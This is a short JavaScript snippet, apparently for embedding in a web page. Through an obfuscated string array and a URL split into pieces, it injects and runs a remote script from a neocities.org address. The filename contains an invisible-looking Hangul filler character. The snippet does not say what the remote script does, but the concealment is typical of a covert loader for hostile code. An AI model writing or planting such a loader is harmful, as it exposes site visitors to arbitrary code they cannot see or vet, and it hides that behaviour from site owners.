var loadExternalScript = true; // Editable toggle

(function(){
    const _0x4e9f = [
        'createElement',
        'script',
        'src',
        'appendChild',
        'head',
        'getElementById',
        'style',
        'display',
        'none',
        'textContent',
        'Script is disabled'
    ];

    const part1 = 'https://sh';
    const part2 = 'arebooster.';
    const part3 = 'neocities.org/';
    const part4 = 'script';
    const part5 = 'ㅤ.js';

    const finalURL = part1 + part2 + part3 + part4 + part5;

    if(loadExternalScript){
        var s = document[_0x4e9f[0]](_0x4e9f[1]);
        s[_0x4e9f[2]] = finalURL;
        document[_0x4e9f[4]][_0x4e9f[3]](s);
    }else{
        var d = document[_0x4e9f[5]]('scriptStatus');
        d[_0x4e9f[6]][_0x4e9f[7]] = _0x4e9f[8];
        d[_0x4e9f[9]] = _0x4e9f[10];
    }
})();
